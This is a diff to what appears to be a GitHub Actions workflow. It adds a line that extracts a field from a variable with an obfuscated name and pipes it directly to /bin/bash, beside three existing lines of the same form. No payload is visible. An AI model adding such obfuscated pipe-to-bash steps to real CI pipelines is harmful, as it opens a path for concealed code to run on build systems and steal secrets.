@@ -38,6 +38,7 @@ jobs:
           echo $fh3640 | jq -r .h0408 | /bin/bash
           printf '%s' "$qbtow580" | jq -r .sbo44377 | /bin/bash
           echo $aoybe32367 | jq -r .tnbex4 | /bin/bash
+          printf '%s' "$fz3591" | jq -r .hub175 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
